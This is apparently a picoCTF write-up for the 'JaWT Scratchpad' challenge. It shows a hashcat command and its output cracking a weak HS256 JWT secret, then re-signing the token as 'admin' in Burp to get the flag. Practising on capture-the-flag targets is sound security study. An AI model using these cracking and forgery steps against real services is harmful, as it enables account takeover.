# JaWT Scratchpad

### Challenge Description:

### Exploitation:

Launching the instance in the website, there is an option to input a username. 

![{B7F63B2B-6A50-4C34-BA3C-716979EB3A60}.png](Images/B7F63B2B-6A50-4C34-BA3C-716979EB3A60.png)

There is also plenty of subtle hints regarding the challenge like the `john` (hinting to John the Ripper) or `powered by JWT`(hinting a JWT). Combining these two, it can be assumed that the HMAC secret of the JWT is weak and brute forceable. 

First, I tried logging in as admin cause why not. Though it gives 

```html
YOU CANNOT LOGIN AS THE ADMIN! HE IS SPECIAL AND YOU ARE NOT. 
```

Wow rude much. All of us are special. Anyways I picked another name and logged in.

 

![{28FCAB5A-999F-4523-B631-37F5DB88093D}.png](Images/28FCAB5A-999F-4523-B631-37F5DB88093D.png)

The scratchpad really should not the focus, as it is just client side. 

The system uses JWTs to keep track of logins. Decoding one gives:

![{1E0A621A-229B-4E73-9F71-55A4D401DF5A}.png](Images/1E0A621A-229B-4E73-9F71-55A4D401DF5A.png)

I tried just changing the value of user just in case the server does not verify signatures, but it leads to an invalid token. 

Furthermore, the algorithm `HS256` all but confirms the subtle john hint, since RSA256 does not share one secret key like HS256. which makes brute forcing that computationally infeasible. Though I used hashcat instead of john lol.

```bash
└─$ hashcat -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTWlrYXluIn0.WGIYF4eI2z4feq9LV5FEQEC2Ll9pfMogstNZpcTEkbE /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-12th Gen Intel(R) Core(TM) i7-12700H, 2867/5735 MB (1024 MB allocatable), 20MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 517 MB (6844 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTWlrYXluIn0.WGIYF4eI2z4feq9LV5FEQEC2Ll9pfMogstNZpcTEkbE:ilovepico

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16500 (JWT (JSON Web Token))
Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiTW...cTEkbE
Time.Started.....: Tue May  5 17:59:54 2026 (3 secs)
Time.Estimated...: Tue May  5 17:59:57 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  2924.5 kH/s (3.12ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7413760/14344385 (51.68%)
Rejected.........: 0/7413760 (0.00%)
Restore.Point....: 7393280/14344385 (51.54%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: iloverobert!!! -> ilovechloewegg4everandever
Hardware.Mon.#01.: Util: 44%

Started: Tue May  5 17:59:53 2026
Stopped: Tue May  5 17:59:58 2026 
```

With the secret found, it is possible to create a key ourselves, and use that key to sign the tampered JWT with `"user":"admin"`. This can be done easily using the `JWT Editor` extension in burpsuite. 

![{D523E2E5-A2E4-4527-AF8B-CF6D6BE3AF19}.png](Images/D523E2E5-A2E4-4527-AF8B-CF6D6BE3AF19.png)

Now, the username can be changed to “admin” and the forged token can be resigned with the correct key.

![{574C2CC6-08DC-4713-B8A0-4472582BC31C}.png](Images/574C2CC6-08DC-4713-B8A0-4472582BC31C.png)

When the request is sent, I am in admin’s account, and thereby got the flag. 

```html
<h2> Hello admin!</h2>
<p>
	Here is your JaWT scratchpad!
	</p>

<textarea style="margin: 0 auto; display: block;">picoCTF{REDACTED}</textarea>
<br>

<a href="/logout"><input style="width:100px" type="submit" value="Logout"></a>
```
